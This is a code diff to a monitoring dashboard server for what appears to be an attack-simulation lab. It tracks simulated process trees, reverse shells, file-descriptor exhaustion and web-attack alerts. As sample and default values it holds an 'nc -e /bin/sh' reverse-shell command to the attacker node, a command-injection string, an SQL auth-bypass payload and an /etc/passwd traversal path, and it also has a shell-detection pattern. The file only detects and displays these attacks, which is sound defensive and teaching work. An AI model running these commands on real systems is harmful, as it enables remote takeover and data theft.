@@ -10,6 +10,9 @@ import type {
   ArpCacheEntry,
   SniffedPacket,
   NetworkAttackState,
+  ProcessTreeNode,
+  L7SecurityAlert,
+  OsAndL7AttackState,
 } from '@shared/schemas';
 import type { AttackEvent } from '@shared/schemas/attack-event';
 import { readFileSync } from 'node:fs';
@@ -146,6 +149,334 @@ function resetNetworkState() {
   };
   networkState.syn_history = Array(SYN_HISTORY_LENGTH).fill(0);
   networkState.last_updated = new Date().toISOString();
+}
+
+// ==========================================
+// W4-T1: OS & L7 ATTACK STATE (PSTREE, REVERSE SHELL, LSOF FD GAUGE, SQLI/BRUTE-FORCE ALERTS)
+// ==========================================
+function createCleanProcessTree(): ProcessTreeNode[] {
+  return [
+    {
+      pid: 1,
+      name: 'python3',
+      cmd: 'python3 /app/target-entrypoint.py',
+      user: 'root',
+      suspicious: false,
+      children: [
+        {
+          pid: 18,
+          name: 'sshd',
+          cmd: '/usr/sbin/sshd -D -e',
+          user: 'root',
+          suspicious: false,
+          children: [],
+        },
+        {
+          pid: 24,
+          name: 'node',
+          cmd: 'node dist/main.js (Target Server :8000)',
+          user: 'node',
+          suspicious: false,
+          children: [
+            {
+              pid: 31,
+              name: 'sqlite3-worker',
+              cmd: 'sqlite3 /data/target.sqlite',
+              user: 'node',
+              suspicious: false,
+            },
+          ],
+        },
+      ],
+    },
+  ];
+}
+
+function createCleanOsL7State(): OsAndL7AttackState {
+  return {
+    pstree: createCleanProcessTree(),
+    suspicious_processes: [],
+    reverse_shell: {
+      active: false,
+      spawned_at: null,
+      shell_cmd: null,
+      server_ip: config.nodes.target,
+      hacker_ip: config.nodes.attacker,
+      hacker_port: 4444,
+      pid: null,
+    },
+    fd_metrics: {
+      open_fds: 42,
+      max_fds: 1024,
+      peak_fds: 42,
+      status: 'NORMAL',
+      suspicious_files: [],
+      process_count: 4,
+    },
+    l7_alerts: [],
+    l7_counters: {
+      sqli_count: 0,
+      brute_force_count: 0,
+      cmd_injection_count: 0,
+      path_traversal_count: 0,
+      heavy_dos_count: 0,
+    },
+    last_updated: new Date().toISOString(),
+  };
+}
+
+let osL7State: OsAndL7AttackState = createCleanOsL7State();
+let bruteForceAttemptsTracker = 0;
+
+function resetOsL7State() {
+  osL7State = createCleanOsL7State();
+  bruteForceAttemptsTracker = 0;
+}
+
+function computeFdStatus(openFds: number, maxFds: number): 'NORMAL' | 'WARNING' | 'EXHAUSTED' {
+  const ratio = maxFds > 0 ? openFds / maxFds : 0;
+  if (ratio >= 0.85) return 'EXHAUSTED';
+  if (ratio >= 0.55) return 'WARNING';
+  return 'NORMAL';
+}
+
+function updateFdMetrics(openFds: number, maxFds?: number, extraFile?: string) {
+  if (typeof maxFds === 'number' && maxFds > 0) {
+    osL7State.fd_metrics.max_fds = maxFds;
+  }
+  const clamped = Math.max(12, Math.min(osL7State.fd_metrics.max_fds, Math.round(openFds)));
+  osL7State.fd_metrics.open_fds = clamped;
+  if (clamped > osL7State.fd_metrics.peak_fds) {
+    osL7State.fd_metrics.peak_fds = clamped;
+  }
+  osL7State.fd_metrics.status = computeFdStatus(clamped, osL7State.fd_metrics.max_fds);
+  if (extraFile && !osL7State.fd_metrics.suspicious_files.includes(extraFile)) {
+    osL7State.fd_metrics.suspicious_files.push(extraFile);
+    if (osL7State.fd_metrics.suspicious_files.length > 8) {
+      osL7State.fd_metrics.suspicious_files.shift();
+    }
+  }
+  osL7State.last_updated = new Date().toISOString();
+}
+
+function countTreeProcesses(nodes: ProcessTreeNode[]): number {
+  let count = 0;
+  for (const n of nodes) {
+    count += 1;
+    if (Array.isArray(n.children)) {
+      count += countTreeProcesses(n.children);
+    }
+  }
+  return count;
+}
+
+function spawnReverseShellInTree(shellCmd?: string, hackerPort = 4444) {
+  const now = new Date().toISOString();
+  const cmdStr = shellCmd || `nc -e /bin/sh ${config.nodes.attacker} ${hackerPort}`;
+  const shPid = 412;
+  const ncPid = 413;
+
+  const cleanTree = createCleanProcessTree();
+  const rootNode = cleanTree[0];
+  const nodeServerProc = rootNode?.children?.find((c) => c.name === 'node');
+  if (nodeServerProc) {
+    nodeServerProc.children = [
+      ...(nodeServerProc.children || []),
+      {
+        pid: shPid,
+        name: '/bin/sh',
+        cmd: `/bin/sh -c "ping -c 1 127.0.0.1; ${cmdStr}"`,
+        user: 'node',
+        suspicious: true,
+        children: [
+          {
+            pid: ncPid,
+            name: 'nc',
+            cmd: cmdStr,
+            user: 'node',
+            suspicious: true,
+            children: [
+              {
+                pid: 414,
+                name: '/bin/sh',
+                cmd: '/bin/sh -i (interactive reverse shell)',
+                user: 'node',
+                suspicious: true,
+              },
+            ],
+          },
+        ],
+      },
+    ];
+  }
+
+  osL7State.pstree = cleanTree;
+  osL7State.suspicious_processes = ['/bin/sh -c', cmdStr, '/bin/sh -i'];
+  osL7State.reverse_shell = {
+    active: true,
+    spawned_at: now,
+    shell_cmd: cmdStr,
+    server_ip: config.nodes.target,
+    hacker_ip: config.nodes.attacker,
+    hacker_port: hackerPort,
+    pid: ncPid,
+  };
+  osL7State.fd_metrics.process_count = countTreeProcesses(osL7State.pstree);
+  updateFdMetrics(
+    Math.max(osL7State.fd_metrics.open_fds + 18, 76),
+    undefined,
+    `socket:[reverse-shell -> ${config.nodes.attacker}:${hackerPort}]`,
+  );
+  osL7State.last_updated = now;
+}
+
+function appendL7Alert(alert: Omit<L7SecurityAlert, 'id' | 'timestamp'> & { id?: string; timestamp?: string }) {
+  const entry: L7SecurityAlert = {
+    id: alert.id || `l7-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
+    timestamp: alert.timestamp || new Date().toISOString(),
+    category: alert.category,
+    severity: alert.severity,
+    client_ip: alert.client_ip,
+    endpoint: alert.endpoint,
+    payload_preview: alert.payload_preview,
+    status_code: alert.status_code,
+    blocked: alert.blocked,
+    attempts_count: alert.attempts_count,
+    rate_rps: alert.rate_rps,
+  };
+  osL7State.l7_alerts.push(entry);
+  if (osL7State.l7_alerts.length > 50) {
+    osL7State.l7_alerts.shift();
+  }
+  osL7State.last_updated = entry.timestamp;
+  return entry;
+}
+
+function updateOsAndL7FromLog(log: TelemetryLog) {
+  const tag = log.attack_tag || 'NORMAL';
+  const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
+    ? (log.payload_summary as Record<string, unknown>)
+    : {};
+  const body = typeof summary.body_preview === 'object' && summary.body_preview !== null
+    ? (summary.body_preview as Record<string, unknown>)
+    : {};
+  const query = typeof summary.query === 'object' && summary.query !== null
+    ? (summary.query as Record<string, unknown>)
+    : {};
+  const isBlocked =
+    log.defense_action === 'blocked' ||
+    log.defense_action === 'sanitized' ||
+    log.defense_action === 'rate_limited' ||
+    log.status_code === 400 ||
+    log.status_code === 401 ||
+    log.status_code === 403 ||
+    log.status_code === 429;
+  const ts = typeof log.timestamp === 'string' ? log.timestamp : new Date().toISOString();
+
+  if (tag === 'SQL_INJECTION') {
+    osL7State.l7_counters.sqli_count += 1;
+    const rawUser = typeof body.username === 'string' ? body.username : "admin' OR '1'='1' --";
+    appendL7Alert({
+      timestamp: ts,
+      category: 'SQL_INJECTION',
+      severity: 'CRITICAL',
+      client_ip: log.client_ip,
+      endpoint: log.endpoint,
+      payload_preview: `username="${rawUser}" (SQL Auth Bypass)`,
+      status_code: log.status_code,
+      blocked: isBlocked && log.status_code !== 200,
+    });
+  } else if (
+    tag === 'BRUTE_FORCE' ||
+    (log.endpoint.includes('login') && (log.status_code === 401 || log.status_code === 429) && tag !== 'SQL_INJECTION')
+  ) {
+    osL7State.l7_counters.brute_force_count += 1;
+    const attempts = typeof summary.attempts_count === 'number'
+      ? summary.attempts_count
+      : (bruteForceAttemptsTracker += 1);
+    const rateRps = typeof summary.rate_rps === 'number' ? summary.rate_rps : 1;
+    const userTarget = typeof body.username === 'string' ? body.username : 'admin';
+    const passGuess = typeof body.password === 'string' ? body.password : ` wordlist#${attempts}`;
+    appendL7Alert({
+      timestamp: ts,
+      category: 'BRUTE_FORCE',
+      severity: attempts >= 5 ? 'CRITICAL' : 'HIGH',
+      client_ip: log.client_ip,
+      endpoint: log.endpoint,
+      payload_preview: `user="${userTarget}" pass="${passGuess}" (${attempts} attempts @ ${rateRps} req/s)`,
+      status_code: log.status_code,
+      blocked: log.status_code === 429 || log.defense_action === 'rate_limited',
+      attempts_count: attempts,
+      rate_rps: rateRps,
+    });
+  } else if (tag === 'COMMAND_INJECTION' || tag === 'REVERSE_SHELL') {
+    osL7State.l7_counters.cmd_injection_count += 1;
+    const hostParam = typeof query.host === 'string'
+      ? query.host
+      : typeof summary.shell_cmd === 'string'
+        ? summary.shell_cmd
+        : `127.0.0.1; nc -e /bin/sh ${config.nodes.attacker} 4444`;
+    const blocked = (log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized') && tag !== 'REVERSE_SHELL';
+    appendL7Alert({
+      timestamp: ts,
+      category: 'COMMAND_INJECTION',
+      severity: 'CRITICAL',
+      client_ip: log.client_ip,
+      endpoint: log.endpoint,
+      payload_preview: `cmd="${hostParam}"`,
+      status_code: log.status_code,
+      blocked,
+    });
+    if (!blocked) {
+      const shellCmd = typeof summary.shell_cmd === 'string'
+        ? summary.shell_cmd
+        : `nc -e /bin/sh ${config.nodes.attacker} 4444`;
+      spawnReverseShellInTree(shellCmd);
+    }
+  } else if (tag === 'PATH_TRAVERSAL') {
+    osL7State.l7_counters.path_traversal_count += 1;
+    const targetFile = typeof query.file === 'string'
+      ? query.file
+      : typeof summary.target_file === 'string'
+        ? summary.target_file
+        : '../../../../etc/passwd';
+    const blocked = log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized';
+    appendL7Alert({
+      timestamp: ts,
+      category: 'PATH_TRAVERSAL',
+      severity: 'HIGH',
+      client_ip: log.client_ip,
+      endpoint: log.endpoint,
+      payload_preview: `file="${targetFile}"`,
+      status_code: log.status_code,
+      blocked,
+    });
+    if (!blocked) {
+      updateFdMetrics(osL7State.fd_metrics.open_fds + 6, undefined, targetFile.includes('environ') ? '/proc/self/environ' : '/etc/passwd');
+    }
+  } else if (tag === 'FD_EXHAUSTION' || tag === 'FORK_BOMB') {
+    const requestedFds = typeof summary.open_fds === 'number' ? summary.open_fds : 960;
+    const maxFds = typeof summary.max_fds === 'number' ? summary.max_fds : osL7State.fd_metrics.max_fds;
+    updateFdMetrics(requestedFds, maxFds, '/tmp/fd_exhaust_hold_* (x900)');
+    osL7State.fd_metrics.process_count = tag === 'FORK_BOMB' ? 128 : Math.max(8, osL7State.fd_metrics.process_count);
+  } else if (tag === 'HEAVY_DOS') {
+    osL7State.l7_counters.heavy_dos_count += 1;
+    const iter = typeof query.iterations === 'number' ? query.iterations : 500000;
+    const blocked = log.status_code === 429 || log.defense_action === 'rate_limited';
+    appendL7Alert({
+      timestamp: ts,
+      category: 'HEAVY_DOS',
+      severity: 'HIGH',
+      client_ip: log.client_ip,
+      endpoint: log.endpoint,
+      payload_preview: `Heavy Report CPU Exhaustion (iterations=${iter})`,
+      status_code: log.status_code,
+      blocked,
+    });
+    if (!blocked) {
+      updateFdMetrics(Math.min(osL7State.fd_metrics.max_fds, osL7State.fd_metrics.open_fds + 45));
+    }
+  }
 }
 
 function appendSniffedPacket(packet: Omit<SniffedPacket, 'id' | 'timestamp'> & { id?: string; timestamp?: string }) {
@@ -305,8 +636,9 @@ app.post('/api/telemetry', (req: Request, res: Response) => {
   // 1. Lưu vào Ring Buffer (FIFO, max 300)
   telemetryBuffer.push(log);
 
-  // 2. Cập nhật chỉ số socket
+  // 2. Cập nhật chỉ số socket & trạng thái OS/L7 (W4-T1)
   updateTcpMetrics(log);
+  updateOsAndL7FromLog(log);
 
   // 3. Phát tán sự kiện thời gian thực qua WebSocket
   io.emit('GOD_VIEW_UPDATE', {
@@ -314,6 +646,7 @@ app.post('/api/telemetry', (req: Request, res: Response) => {
     buffer_size: telemetryBuffer.size(),
     metrics: socketMetrics,
     network_state: networkState,
+    os_l7_state: osL7State,
     defense_l3_state: defense.state,
   });
 
@@ -337,6 +670,7 @@ app.get('/api/telemetry/history', (req: Request, res: Response) => {
     defense_l3_state: defense.state,
     metrics: socketMetrics,
     network_state: networkState,
+    os_l7_state: osL7State,
   });
 });
 
@@ -351,12 +685,14 @@ app.delete('/api/telemetry/clear', (req: Request, res: Response) => {
   socketMetrics.established = 12;
   socketMetrics.time_wait = 4;
   resetNetworkState();
+  resetOsL7State();
 
   // Phát tín hiệu reset đến tất cả client đang kết nối
   io.emit('GOD_VIEW_RESET', {
     message: 'Telemetry buffer cleared by user.',
     timestamp: new Date().toISOString(),
     network_state: networkState,
+    os_l7_state: osL7State,
     metrics: socketMetrics,
   });
 
@@ -436,10 +772,10 @@ app.post('/api/telemetry/network', (req: Request, res: Response) => {
 
 /**
  * POST /api/telemetry/host
- * Điểm tiếp nhận thông số Kernel/OS & Network (/proc/net/tcp, /proc/net/arp) từ Telemetry Agent
+ * Điểm tiếp nhận thông số Kernel/OS & Network (/proc/net/tcp, /proc/net/arp, lsof, pstree) từ Telemetry Agent
  */
 app.post('/api/telemetry/host', (req: Request, res: Response) => {
-  const { metrics, arp_table } = req.body || {};
+  const { metrics, arp_table, pstree, reverse_shell } = req.body || {};
   if (!metrics || typeof metrics !== 'object') {
     res.status(400).json({ success: false, message: 'Missing metrics payload' });
     return;
@@ -459,8 +795,42 @@ app.post('/api/telemetry/host', (req: Request, res: Response) => {
     networkState.last_updated = socketMetrics.last_updated;
   }
 
+  if (typeof metrics.open_fds === 'number') {
+    updateFdMetrics(
+      metrics.open_fds,
+      typeof metrics.max_fds === 'number' ? metrics.max_fds : undefined,
+    );
+  }
+  if (typeof metrics.process_count === 'number') {
+    osL7State.fd_metrics.process_count = metrics.process_count;
+  }
+  if (Array.isArray(metrics.suspicious_processes)) {
+    osL7State.suspicious_processes = metrics.suspicious_processes;
+    const hasShell = metrics.suspicious_processes.some(
+      (p: string) => p.includes('/bin/sh') || p.includes('nc') || p.includes('bash'),
+    );
+    if (hasShell && !osL7State.reverse_shell.active) {
+      spawnReverseShellInTree(metrics.suspicious_processes.join(' -> '));
+    }
+  }
+  if (Array.isArray(pstree) && pstree.length > 0) {
+    osL7State.pstree = pstree;
+    osL7State.fd_metrics.process_count = countTreeProcesses(pstree);
+  }
+  if (reverse_shell && typeof reverse_shell === 'object') {
+    osL7State.reverse_shell = {
+      ...osL7State.reverse_shell,
+      ...reverse_shell,
+    };
+  }
+  osL7State.last_updated = socketMetrics.last_updated;
+
   io.emit('NETWORK_STATE_UPDATE', {
     network_state: networkState,
+    metrics: socketMetrics,
+  });
+  io.emit('OS_L7_STATE_UPDATE', {
+    os_l7_state: osL7State,
     metrics: socketMetrics,
   });
 
@@ -469,6 +839,79 @@ app.post('/api/telemetry/host', (req: Request, res: Response) => {
     metrics_updated: true,
     metrics: socketMetrics,
     network_state: networkState,
+    os_l7_state: osL7State,
+  });
+});
+
+/**
+ * GET /api/telemetry/os
+ * Trả về trạng thái giám sát HĐH & Tầng Ứng dụng L7 (Task W4-T1: pstree, reverse_shell, fd_metrics, l7_alerts)
+ */
+app.get('/api/telemetry/os', (_req: Request, res: Response) => {
+  res.status(200).json({
+    success: true,
+    os_l7_state: osL7State,
+    metrics: socketMetrics,
+  });
+});
+
+/**
+ * POST /api/telemetry/os
+ * Cập nhật hoặc khôi phục trạng thái HĐH & L7 (Task W4-T1 / W4-T2)
+ */
+app.post('/api/telemetry/os', (req: Request, res: Response) => {
+  const body = req.body || {};
+
+  if (body.action === 'reset_os') {
+    osL7State.pstree = createCleanProcessTree();
+    osL7State.suspicious_processes = [];
+    osL7State.reverse_shell = {
+      active: false,
+      spawned_at: null,
+      shell_cmd: null,
+      server_ip: config.nodes.target,
+      hacker_ip: config.nodes.attacker,
+      hacker_port: 4444,
+      pid: null,
+    };
+    osL7State.fd_metrics = {
+      open_fds: 42,
+      max_fds: 1024,
+      peak_fds: osL7State.fd_metrics.peak_fds,
+      status: 'NORMAL',
+      suspicious_files: [],
+      process_count: 4,
+    };
+    osL7State.last_updated = new Date().toISOString();
+  } else if (body.action === 'spawn_reverse_shell' || body.reverse_shell_active === true) {
+    spawnReverseShellInTree(
+      typeof body.shell_cmd === 'string' ? body.shell_cmd : undefined,
+      typeof body.hacker_port === 'number' ? body.hacker_port : 4444,
+    );
+  }
+
+  if (typeof body.open_fds === 'number') {
+    updateFdMetrics(
+      body.open_fds,
+      typeof body.max_fds === 'number' ? body.max_fds : undefined,
+      typeof body.suspicious_file === 'string' ? body.suspicious_file : undefined,
+    );
+  }
+
+  if (Array.isArray(body.pstree) && body.pstree.length > 0) {
+    osL7State.pstree = body.pstree;
+    osL7State.fd_metrics.process_count = countTreeProcesses(body.pstree);
+  }
+
+  io.emit('OS_L7_STATE_UPDATE', {
+    os_l7_state: osL7State,
+    metrics: socketMetrics,
+  });
+
+  res.status(200).json({
+    success: true,
+    os_l7_state: osL7State,
+    metrics: socketMetrics,
   });
 });
 
@@ -585,6 +1028,19 @@ app.post('/api/events/attack', (req: Request, res: Response) => {
       recordSynHistory(socketMetrics.syn_recv);
       io.emit('NETWORK_STATE_UPDATE', { network_state: networkState, metrics: socketMetrics });
     }
+  } else if (event.scenario === 'S3') {
+    // Đồng bộ đồng hồ File Descriptors (lsof) khi nhận sự kiện kịch bản S3 (FD Exhaustion)
+    const p = event.payload as Record<string, unknown>;
+    if (p.state === 'STARTING' || p.state === 'RUNNING' || p.type === 'progress' || p.state === 'COMPLETED') {
+      const opened = typeof p.opened_count === 'number'
+        ? p.opened_count
+        : typeof p.max_fds === 'number'
+          ? p.max_fds
+          : 920;
+      const limitVal = typeof p.soft_limit === 'number' ? p.soft_limit : osL7State.fd_metrics.max_fds;
+      updateFdMetrics(Math.max(opened, Math.round(limitVal * 0.9)), limitVal, '/tmp/pbl4_fd_exhaust_*');
+      io.emit('OS_L7_STATE_UPDATE', { os_l7_state: osL7State, metrics: socketMetrics });
+    }
   }
 
   io.emit('ATTACK_EVENT', event);
@@ -646,6 +1102,7 @@ io.on('connection', (socket) => {
     nodes: config.nodes,
     metrics: socketMetrics,
     network_state: networkState,
+    os_l7_state: osL7State,
     defense_l3_state: defense.state,
     capacity: telemetryBuffer.getCapacity(),
   });
